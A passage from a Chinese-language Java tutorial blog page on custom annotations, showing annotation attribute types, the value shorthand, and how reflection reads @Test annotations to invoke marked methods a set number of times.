Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 自定义注解演示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Anno02 &#123;</span><br><span class="line">    <span class="comment">// 定义一个基本类型的属性</span></span><br><span class="line">    <span class="comment">// int num() default 123;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">num</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个String类型的属性</span></span><br><span class="line">    <span class="comment">// public String name() default &quot;张三丰&quot;;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个Class类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">clazz</span><span class="params">()</span> <span class="keyword">default</span> String.class</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个注解类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Anno <span class="title">anno</span><span class="params">()</span> <span class="keyword">default</span> @Anno</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个枚举类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Season <span class="title">siji</span><span class="params">()</span> <span class="keyword">default</span> Season.SPRING</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/*  // 定义一个基本类型数组的属性</span></span><br><span class="line"><span class="comment">    int[] nums();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 定义一个String类型数组的属性</span></span><br><span class="line"><span class="comment">    public String[] names();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 定义一个Class类型数组的属性</span></span><br><span class="line"><span class="comment">    public Class[] clazzs();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 定义一个注解类型数组的属性</span></span><br><span class="line"><span class="comment">    public Anno[] annos();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 定义一个枚举类型数组的属性</span></span><br><span class="line"><span class="comment">    public Season[] sijis();</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>使用注解<code>AnnoDemo.java</code>  </p><h4 id="2-5-3value属性"><a href="#2-5-3value属性" class="headerlink" title="2.5.3value属性"></a>2.5.3<code>value</code>属性</h4><ul><li><code>value</code>属性使用频率较高，所以可以在使用注解的时候可以简化 <ul><li> 使用注解的时候，<strong>如果只有一个属性需要手动指定，并且该属性为value属性，其中</strong><code>**value=**</code><strong>就可以省略不写</strong> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下两种方式效果一样</span></span><br><span class="line"><span class="comment">//@Anno2(value = &quot;itcast&quot;)</span></span><br><span class="line"><span class="comment">//@Anno2(&quot;itcast&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnoDemo</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li> 代码</li><li> <code>Anno1.java</code> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 自定义注解演示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> AnnoDemo02 &#123;</span><br><span class="line">    <span class="comment">// 定义一个基本类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">num</span><span class="params">()</span> <span class="keyword">default</span> 123</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个String类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个Class类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">clazz</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个注解类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Anno <span class="title">anno</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个枚举类型的属性</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Season <span class="title">siji</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个基本类型数组的属性</span></span><br><span class="line">    <span class="keyword">int</span>[] nums();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个String类型数组的属性</span></span><br><span class="line">    <span class="keyword">public</span> String[] names();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个Class类型数组的属性</span></span><br><span class="line">    <span class="keyword">public</span> Class[] clazzs();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个注解类型数组的属性</span></span><br><span class="line">    <span class="keyword">public</span> Anno[] annos();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个枚举类型数组的属性</span></span><br><span class="line">    <span class="keyword">public</span> Season[] sijis();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> <code>AnnoDemo.java</code>使用注解 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在使用注解的时候如果注解里面的属性没有指定默认值。</span></span><br><span class="line"><span class="comment">//那么我们就需要手动给出注解属性的设置值。</span></span><br><span class="line"><span class="comment">// 注解在使用的时候，所有的属性必须有值；</span></span><br><span class="line"><span class="comment">// 通过赋默认值，或者在使用的时候指定值都可以</span></span><br><span class="line"><span class="comment">// 使用的时候指定值的格式  注解(属性名1=属性值1,属性名2=属性值2)</span></span><br><span class="line"><span class="meta">@Anno1(name = &quot;itheima&quot;)</span> <span class="comment">// 这里的使用，仅仅是打了一个标记</span></span><br><span class="line"><span class="comment">//@Anno1(&quot;abc&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnoDemo</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>注意</p></blockquote><ul><li> 使用注解标注某个元素后，仅仅是打了一个标记/记号/标签，但是他还不能产生效果 </li><li> 如果想要有效果，就需要通过反射获取被标注的元素，再根据这个元素获取其标注的注解；根据注解类型以及注解的属性值，写代码做不同的处理。这个时候，注解才有了效果/作用。<br>eg：定身符。如果普通人拿张纸写个符，贴上没用；道士，拿张纸写个符，再对符施个法，这个符贴上去才有用。施法≈反射 </li></ul><h3 id="2-6-解析自定义注解"><a href="#2-6-解析自定义注解" class="headerlink" title="2.6 解析自定义注解"></a>2.6 解析自定义注解</h3><p>需要先定义自定义注解，才有注解可以解析；通过反射解析注解</p><h4 id="2-6-1-快速入门-注解无属性"><a href="#2-6-1-快速入门-注解无属性" class="headerlink" title="2.6.1 快速入门-注解无属性"></a>2.6.1 快速入门-注解无属性</h4><blockquote><p>相关API</p></blockquote><table><thead><tr><th>方法签名</th><th>作用</th><th>所属类</th></tr></thead><tbody><tr><td>boolean isAnnotationPresent(Class AnnoClass)</td><td>判断某个方法上是否标注某个注解</td><td>Method</td></tr><tr><td>boolean isAnnotationPresent(Class AnnoClass)</td><td>判断某个属性上是否标注某个注解</td><td>Field</td></tr><tr><td>boolean isAnnotationPresent(Class AnnoClass)</td><td>判断某个构造上是否标注某个注解</td><td>Constructor</td></tr></tbody></table><p>定义好注解之后，可以将其标注在一个类上/方法上等位置，但这样做仅仅是打了一个标记，并不会有神奇的效果产生。</p><p>如果想要有一些效果，就需要配合反射，解析对应的注解。</p><blockquote><p>案例：</p></blockquote><ul><li>需求 <ul><li>自定义一个注解@Test，用于标注在方法上；如果一个类的某个方法标注了@Test注解，就执行该方法</li></ul></li><li>实现步骤 <ol><li> 自定义一个注解Test </li><li>新建一个类A，类中编写方法，并标注自定义的@Test注解（写多个方法，只有部分方法标注@Test注解）<br>（标注之后，没有任何效果，需要配合反射才能产生效果） </li><li> 在测试类中，获取A类的Class对象， </li><li> 获取类中所有的方法对象 </li><li> 遍历每一个方法对象，判断是否有对应的注解； </li><li> 有对应注解的方法，我们要通过反射调用之；否则，不作任何处理。 </li></ol></li><li> 代码实现 </li><li> 自定义一个注解<code>@Test</code> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//表示Test这个注解的存活时间</span></span><br><span class="line"><span class="meta">@Retention(value = RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Test &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 定义一个类，使用该注解 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.annotest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该类的某些方法上会标注自定义了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022/9/9 12:01</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 该类的某些方法上会标注自定义了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UseTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method1 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 该方法标注了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment">     * 我们想要的效果：</span></span><br><span class="line"><span class="comment">     *  被标注的方法自动执行，不需要我们手动调用。</span></span><br><span class="line"><span class="comment">     *  配合反射，才能达到我们想要的效果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method2 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 该方法标注了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment">     * 我们想要的效果：</span></span><br><span class="line"><span class="comment">     *  被标注的方法自动执行，不需要我们手动调用。</span></span><br><span class="line"><span class="comment">     *  配合反射，才能达到我们想要的效果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method3 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method4 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 定义一个测试类，内部编写：解析注解并给出不同处理的逻辑代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.annotest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类，该类总通过反射，识别注解，并让注解产生效果</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022/9/9 12:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 测试类，该类总通过反射，识别注解，并让注解产生效果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnoTestDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 在测试类中，获取A类的Class对象，</span></span><br><span class="line">        Class useTestClassObj = Class.forName(<span class="string">&quot;com.itheima.annotest.UseTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 获取类中所有的方法对象</span></span><br><span class="line">        Method[] methods = useTestClassObj.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 遍历每一个方法对象，判断是否有对应的注解；</span></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="comment">// 3.1 判断是否有对应的注解；</span></span><br><span class="line">            <span class="keyword">if</span> (method.isAnnotationPresent(Test.class)) &#123;</span><br><span class="line">                <span class="comment">// 3.2 如果有，就反射调用</span></span><br><span class="line">                <span class="comment">// 所有方法默认没有返回值没有参数，不对返回值/参数做处理了</span></span><br><span class="line">                method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                method.invoke(useTestClassObj.newInstance());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3.3否则不做任何处理。不需要写相关代码</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. 有对应注解的方法，我们要通过反射调用之；否则，不作任何处理。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-6-2-注解属性使用"><a href="#2-6-2-注解属性使用" class="headerlink" title="2.6.2 注解属性使用"></a>2.6.2 注解属性使用</h4><blockquote><p>相关API</p></blockquote><table><thead><tr><th>方法签名</th><th>作用</th><th>所属类</th></tr></thead><tbody><tr><td>boolean getAnnotation(Class AnnoClass)</td><td>获取某个方法上标注的指定注解的对象</td><td>Method</td></tr><tr><td>boolean getAnnotation(Class AnnoClass)</td><td>获取某个变量上标注的指定注解的对象</td><td>Field</td></tr><tr><td>boolean getAnnotation(Class AnnoClass)</td><td>获取某个构造方法上标注的指定注解的对象</td><td>Constructor</td></tr></tbody></table><blockquote><p>案例：</p></blockquote><ul><li>需求 <ul><li>自定义一个注解@Test，用于标注在方法上；如果一个类的某个方法标注了@Test注解，就执行该方法。</li><li>注解提供一个value属性，值为方法的执行次数，默认值为1</li></ul></li><li>实现步骤 <ol><li> 自定义一个注解Test </li><li>新建一个类A，类中编写方法，并标注自定义的@Test注解（写多个方法，只有部分方法标注@Test注解）<br>（标注之后，没有任何效果，需要配合反射才能产生效果） </li><li> 在测试类中，获取A类的Class对象， </li><li> 获取类中所有的方法对象 </li><li> 遍历每一个方法对象，判断是否有对应的注解； </li><li> 有对应注解的方法，我们要获取方法上标注的注解对象的value属性值，通过反射调用方法value次； </li><li> 否则，不作任何处理。 </li></ol></li><li> 代码实现 </li><li> 自定义一个注解<code>@Test</code> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.annotest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 自定义注解解析</span></span><br><span class="line"><span class="comment"> * 目前没有用到他的属性，就不需要为该注解添加属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="comment">// 让该注解保留到运行时。运行时该注解仍可用</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Test &#123;</span><br><span class="line">    <span class="comment">// 定义一个属性，想让给属性代表运行次数</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> 1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 定义一个类，使用该注解 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.annotest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该类的某些方法上会标注自定义了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 该类的某些方法上会标注自定义了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UseTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test(1)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method1 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 该方法标注了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment">     * 我们想要的效果：</span></span><br><span class="line"><span class="comment">     *  被标注的方法自动执行，不需要我们手动调用。</span></span><br><span class="line"><span class="comment">     *  配合反射，才能达到我们想要的效果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method2 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 该方法标注了<span class="doctag">@Test</span>注解</span></span><br><span class="line"><span class="comment">     * 我们想要的效果：</span></span><br><span class="line"><span class="comment">     *  被标注的方法自动执行，不需要我们手动调用。</span></span><br><span class="line"><span class="comment">     *  配合反射，才能达到我们想要的效果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test(value = 10)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method3 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method4 running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 定义一个测试类，内部编写：解析注解并给出不同处理的逻辑代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.annotest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类，该类总通过反射，识别注解，并让注解产生效果</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 测试类，该类总通过反射，识别注解，并让注解产生效果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnoTestDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 在测试类中，获取A类的Class对象，</span></span><br><span class="line">        Class useTestClassObj = Class.forName(<span class="string">&quot;com.itheima.annotest.UseTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 获取类中所有的方法对象</span></span><br><span class="line">        Method[] methods = useTestClassObj.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 遍历每一个方法对象，判断是否有对应的注解；</span></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="comment">// 3.1 判断是否有对应的注解；</span></span><br><span class="line">            <span class="keyword">if</span> (method.isAnnotationPresent(Test.class)) &#123;</span><br><span class="line">                <span class="comment">// 3.2 如果有，就反射调用，并运行与value属性值相等的次数</span></span><br><span class="line">                <span class="comment">// getAnnotation(annoClassObj)  // 返回直接方法上标注的指定注解的对象</span></span><br><span class="line">                <span class="comment">// 第一次进来，是method3方法的标注的@Test注解，所以得到的对象是@com.itheima.annotest.Test(value=10)</span></span><br><span class="line">                <span class="comment">// 获取注解对象</span></span><br><span class="line">                Test testAnnoObj = method.getAnnotation(Test.class);</span><br><span class="line">                <span class="comment">// 获取注解对象的value属性值</span></span><br><span class="line">                <span class="keyword">int</span> value = testAnnoObj.value();</span><br><span class="line"></span><br><span class="line">                method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="comment">// 使用value属性值作为循环次数</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value; i++) &#123;</span><br><span class="line">                    method.invoke(useTestClassObj.newInstance());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3.3否则不做任何处理。不需要写相关代码</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. 有对应注解的方法，我们要通过反射调用之；否则，不作任何处理。</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-7-元注解"><a href="#2-7-元注解" class="headerlink" title="2.7 元注解"></a>2.7 元注解</h3><p>元注解：<code>meta-annotation</code>，就是负责标注其他注解的注解。</p><p><code>JDK5</code>定义了4个标准元注解，它们被用来提供对其它注解做限制说明。</p><h4 id="2-7-1-常见元注解"><a href="#2-7-1-常见元注解" class="headerlink" title="2.7.1 常见元注解"></a>2.7.1 